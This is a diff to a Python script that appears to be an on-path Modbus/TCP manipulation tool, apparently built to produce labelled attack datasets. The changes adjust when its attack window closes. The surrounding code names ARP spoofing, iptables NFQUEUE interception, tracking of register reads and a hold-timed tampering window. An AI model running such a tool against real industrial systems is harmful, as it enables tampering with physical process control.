@@ -344,7 +344,14 @@ def _handle(packet):
     signal_v = CFG["signal"]
     to_value = CFG["to_value"]
     action   = CFG["action"]
-
+    
+    # Close the window from inside the handler too, so a heavy packet stream
+    # (which can starve the main-loop clock) still ends the hold on time.
+    if STATE["window_open"] and STATE["open_ts"] is not None \
+            and (time.monotonic() - STATE["open_ts"]) >= CFG["hold"]:
+        STATE["window_open"] = False
+        STATE["finished"] = True
+        
     # Track FC03 read REQUESTS so we can locate `reg` inside the matching REPLY.
     if to_ab and fc == FC_READ_HOLDING and len(load) >= 12:
         PENDING_READS[(tcp.sport, txid)] = (u16(load, 8), u16(load, 10), time.monotonic())
@@ -484,19 +491,25 @@ def check_timing(args):
         None. May set STATE["finished"]=True.
     """
     nowm = time.monotonic()
-    if CFG["time_mode"] and not STATE["window_open"] and not STATE["finished"]:
+    # time mode: open immediately
+    if CFG["time_mode"] and not STATE["window_open"] and STATE["open_ts"] is None:
         _open_window()
-    if STATE["window_open"] and (nowm - STATE["open_ts"]) >= CFG["hold"]:
-        _close_window(); STATE["finished"] = True
-    if (not CFG["time_mode"] and not STATE["window_open"]
+    # once open, close + FINISH when hold elapses:
+    if STATE["window_open"] and STATE["open_ts"] is not None \
+            and (nowm - STATE["open_ts"]) >= CFG["hold"]:
+        _close_window()
+        STATE["finished"] = True
+        return
+    # event mode: abort ONLY if the window NEVER opened within max_wait:
+    if (not CFG["time_mode"] and STATE["open_ts"] is None
             and (nowm - STATE["armed_ts"]) >= args.max_wait):
         print(f"[{now_iso()}] trigger not seen within {args.max_wait}s -- giving up")
         STATE["finished"] = True
 
 
-# ==========================================================================
+#
 # ON-PATH SETUP / TEARDOWN  (arpspoof + ip_forward + iptables NFQUEUE)
-# ==========================================================================
+# 
 _IPTABLES_RULES = []
 _ARPSPOOF = []
 _ORIG_IP_FORWARD = None
@@ -614,9 +627,9 @@ def teardown_network():
             pass
 
 
-# ==========================================================================
+# 
 # ATTACK LOG
-# ==========================================================================
+# 
 def write_attack_log(args, client_ip, profile):
     """Write the ground-truth attack-log JSON for this run.
 
@@ -658,9 +671,9 @@ def write_attack_log(args, client_ip, profile):
     return path
 
 
-# ==========================================================================
+#
 # CLI + MAIN
-# ==========================================================================
+#
 def build_parser():
     """Build the argparse parser.
 
@@ -788,7 +801,7 @@ def main():
         s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
         s.settimeout(0.5)
         print(f"[{now_iso()}] ARMED -- waiting"
-              f"{' for trigger' if not CFG['time_mode'] else ''} ...")
+              f"{' for trigger signal' if not CFG['time_mode'] else ''} ...")
         while not STATE["finished"]:
             try:
                 nfqueue.run_socket(s)
